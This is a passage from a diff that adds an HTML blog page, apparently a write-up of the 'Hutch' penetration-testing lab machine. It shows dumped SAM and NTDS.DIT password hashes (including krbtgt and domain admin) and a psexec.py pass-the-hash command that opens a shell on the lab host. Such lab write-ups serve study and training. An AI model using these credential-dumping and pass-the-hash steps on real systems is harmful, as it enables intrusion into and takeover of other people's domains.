+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Service RemoteRegistry is in stopped state
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting service RemoteRegistry
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Target system bootKey: 0xb24173e6ac9aa789ab05a4acceeb27ba
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping <span class="nb">local</span> SAM hashes <span class="o">(</span>uid:rid:lmhash:nthash<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:bab179eba40e413086aa37742476c646:::
+</span></span><span class="line"><span class="cl">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class="line"><span class="cl">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class="line"><span class="cl">.
+</span></span><span class="line"><span class="cl">.
+</span></span><span class="line"><span class="cl">.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+</span></span><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:333078b4951591731a68da1d3fb53cdb:::
+</span></span><span class="line"><span class="cl">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class="line"><span class="cl">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3c37d961d2fbbc1eb9e4d09f145ad361:::
+</span></span><span class="line"><span class="cl">hutch.offsec<span class="se">\r</span>placidi:1103:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
+</span></span><span class="line"><span class="cl">hutch.offsec<span class="se">\o</span>patry:1104:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
+</span></span><span class="line"><span class="cl">hutch.offsec<span class="se">\l</span>taunton:1105:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
+</span></span><span class="line"><span class="cl">hutch.offsec<span class="se">\a</span>costello:1106:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
+</span></span><span class="line"><span class="cl">hutch.offsec<span class="se">\j</span>sparwell:1107:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
+</span></span><span class="line"><span class="cl">hutch.offsec<span class="se">\o</span>knee:1108:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
+</span></span><span class="line"><span class="cl">hutch.offsec<span class="se">\j</span>mckendry:1109:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
+</span></span><span class="line"><span class="cl">hutch.offsec<span class="se">\a</span>victoria:1110:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
+</span></span><span class="line"><span class="cl">hutch.offsec<span class="se">\j</span>frarey:1111:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
+</span></span><span class="line"><span class="cl">hutch.offsec<span class="se">\e</span>aburrow:1112:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
+</span></span><span class="line"><span class="cl">hutch.offsec<span class="se">\c</span>luddy:1113:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
+</span></span><span class="line"><span class="cl">hutch.offsec<span class="se">\a</span>gitthouse:1114:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
+</span></span><span class="line"><span class="cl">hutch.offsec<span class="se">\f</span>mcsorley:1115:aad3b435b51404eeaad3b435b51404ee:83bcf188adc71adef071303fae29c1c7:::
+</span></span><span class="line"><span class="cl">hutch.offsec<span class="se">\d</span>omainadmin:1116:aad3b435b51404eeaad3b435b51404ee:8730fa0d1014eb78c61e3957aa7b93d7:::
+</span></span><span class="line"><span class="cl">HUTCHDC$:1000:aad3b435b51404eeaad3b435b51404ee:151657b4aa87d85cebc0543e9d1f095b:::
+</span></span></code></pre></div><h1 id="getting-the-shell">Getting the shell</h1>
+<p><code>psexec.py Administrator@192.168.175.122 -hashes aad3b435b51404eeaad3b435b51404ee:333078b4951591731a68da1d3fb53cdb</code></p>
+<p><img src="Hutch%20aac63fefd54b41fd85acd5e7ed833711/Screenshot_2023-09-26_at_01.04.32.png" alt="Screenshot 2023-09-26 at 01.04.32.png"></p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/kei5uke" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2023 kei5uke.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank"  rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
+    <script src="/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
